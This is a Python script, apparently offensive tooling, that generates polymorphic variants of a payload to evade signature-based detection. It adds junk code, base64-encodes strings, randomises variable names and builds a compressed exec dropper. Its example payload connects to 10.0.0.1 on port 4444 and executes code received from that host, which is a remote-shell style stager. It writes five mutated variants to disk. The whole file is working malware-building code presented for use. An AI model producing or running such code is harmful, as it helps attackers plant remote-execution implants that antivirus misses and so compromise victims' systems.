#!/usr/bin/env python3
"""
Polymorphic Payload Generator
Generates unique payloads for each execution
"""

import random
import base64
import hashlib

class PolymorphicGenerator:
    def __init__(self):
        self.junk_instructions = [
            "x = 1 + 1",
            "y = [i for i in range(10)]",
            "z = {'a': 1, 'b': 2}",
            "import time; time.sleep(0)",
            "_ = hash('random')"
        ]
    
    def generate_xor_key(self):
        """Generate random XOR key"""
        return random.randint(1, 255)
    
    def xor_encrypt(self, data, key):
        """XOR encrypt data"""
        return bytes([b ^ key for b in data])
    
    def add_junk_code(self, code):
        """Add random junk code"""
        junk_count = random.randint(3, 7)
        junk = random.sample(self.junk_instructions, junk_count)
        
        lines = code.split('\n')
        for _ in range(junk_count):
            pos = random.randint(0, len(lines))
            lines.insert(pos, random.choice(junk))
        
        return '\n'.join(lines)
    
    def obfuscate_strings(self, code):
        """Obfuscate string literals"""
        # Simple base64 encoding of strings
        import re
        
        def encode_string(match):
            string = match.group(1)
            encoded = base64.b64encode(string.encode()).decode()
            return f"base64.b64decode('{encoded}').decode()"
        
        pattern = r"'([^']+)'"
        obfuscated = re.sub(pattern, encode_string, code)
        
        return f"import base64\n{obfuscated}"
    
    def generate_unique_payload(self, base_payload):
        """Generate polymorphic variant"""
        
        # 1. Add junk code
        payload = self.add_junk_code(base_payload)
        
        # 2. Obfuscate strings
        payload = self.obfuscate_strings(payload)
        
        # 3. Add random variable names
        payload = self.randomize_variables(payload)
        
        # 4. Calculate unique hash
        payload_hash = hashlib.sha256(payload.encode()).hexdigest()
        
        print(f"[+] Generated unique payload")
        print(f"[+] SHA256: {payload_hash[:16]}...")
        
        return payload
    
    def randomize_variables(self, code):
        """Randomize variable names"""
        var_map = {}
        import re
        
        # Find variable assignments
        pattern = r'\b([a-z_][a-z0-9_]*)\s*='
        variables = set(re.findall(pattern, code))
        
        # Generate random names
        for var in variables:
            if var not in ['import', 'def', 'class']:
                random_name = f"var_{random.randint(10000, 99999)}"
                var_map[var] = random_name
        
        # Replace in code
        for old_var, new_var in var_map.items():
            code = re.sub(rf'\b{old_var}\b', new_var, code)
        
        return code
    
    def create_dropper(self, payload):
        """Create executable dropper"""
        dropper_template = f"""
import base64
import zlib

encrypted_payload = "{base64.b64encode(zlib.compress(payload.encode())).decode()}"

# Decrypt and execute
payload = zlib.decompress(base64.b64decode(encrypted_payload)).decode()
exec(payload)
"""
        return dropper_template

# Example usage
if __name__ == "__main__":
    generator = PolymorphicGenerator()
    
    base_payload = """
import socket
s = socket.socket()
s.connect(('10.0.0.1', 4444))
exec(s.recv(1024))
"""
    
    # Generate 5 unique variants
    for i in range(5):
        print(f"\n[*] Generating variant {i+1}...")
        variant = generator.generate_unique_payload(base_payload)
        
        with open(f"payload_variant_{i+1}.py", "w") as f:
            f.write(variant)
        
        print(f"[+] Saved as payload_variant_{i+1}.py")
